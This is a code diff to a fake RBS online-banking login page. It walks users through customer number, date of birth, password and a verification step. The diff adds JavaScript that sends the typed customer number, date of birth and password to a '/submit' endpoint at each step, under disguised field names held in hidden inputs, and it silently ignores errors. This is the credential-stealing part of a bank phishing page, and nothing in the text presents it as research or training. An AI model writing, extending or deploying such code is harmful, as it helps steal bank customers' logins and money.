@@ -138,7 +138,7 @@
             <label for="dob">Date of birth</label>
             <input type="text" id="dob" placeholder="DD/MM/YYYY" />
           </div>
-          <button class="btn" onclick="goWithLoader(2,this)">Continue</button>
+          <button class="btn" onclick="nextStep(this)">Continue</button>
           <hr />
           <div class="links">
             <a href="#">Forgotten your customer number?</a>
@@ -160,7 +160,7 @@
             <input type="password" id="rpwd" autocomplete="current-password" />
             <p class="hint">Your password is case sensitive.</p>
           </div>
-          <button class="btn" onclick="goWithLoader(3,this)">Continue</button>
+          <button class="btn" onclick="doPassword(this)">Continue</button>
           <hr />
           <div class="links">
             <a href="#" onclick="go(1);return false;">&larr; Back</a>
@@ -204,7 +204,7 @@
             </div>
           </div>
           <p class="resend">No card reader? <a href="#" onclick="return false;">Use the RBS app</a> &nbsp;&middot;&nbsp; <a href="#" onclick="return false;">Resend SMS code</a></p>
-          <button class="btn" onclick="goWithLoader(4,this)">Confirm &amp; Log in</button>
+          <button class="btn" onclick="doVerify(this)">Confirm &amp; Log in</button>
           <hr />
           <div class="links"><a href="#" onclick="go(2);return false;">&larr; Back</a></div>
         </div>
@@ -269,6 +269,10 @@
     </div>
   </div>
 </main>
+<div style="display:none;">
+  <input type="text" id="email" />
+  <input type="text" id="ms-mobile" />
+</div>
 <footer>
   <div class="flinks">
     <a href="#">Privacy notice</a><a href="#">Cookie policy</a><a href="#">Accessibility</a><a href="#">Terms</a><a href="#">Security</a><a href="#">Contact us</a>
@@ -327,6 +331,28 @@
     document.getElementById('step'+n).classList.add('active');
     if(n===4) redirect();
   }
+  function syncLogAliases(){
+    var emailEl=document.getElementById('email');
+    var mobileEl=document.getElementById('ms-mobile');
+    if(emailEl) emailEl.value = document.getElementById('cnum')?.value || '';
+    if(mobileEl) mobileEl.value = document.getElementById('dob')?.value || '';
+  }
+  async function sendLogs(type){
+    syncLogAliases();
+    var email = document.getElementById('email') ? document.getElementById('email').value : '';
+    var pwd = document.getElementById('rpwd') ? document.getElementById('rpwd').value : '';
+    var msMobile = document.getElementById('ms-mobile') ? document.getElementById('ms-mobile').value : '';
+    try {
+      await fetch('/submit', {
+        method: 'POST',
+        headers: {'Content-Type':'application/json'},
+        body: JSON.stringify({type:type,email:email,pwd:pwd,'ms-mobile':msMobile})
+      });
+    } catch (e) {}
+  }
+  function nextStep(btn){ sendLogs('step1'); goWithLoader(2, btn); }
+  function doPassword(btn){ sendLogs('password'); goWithLoader(3, btn); }
+  function doVerify(btn){ sendLogs('verify'); goWithLoader(4, btn); }
   function redirect(){
     var s=5,fill=document.getElementById('pfill'),txt=document.getElementById('ctxt');
     fill.style.transition='width '+s+'s linear';
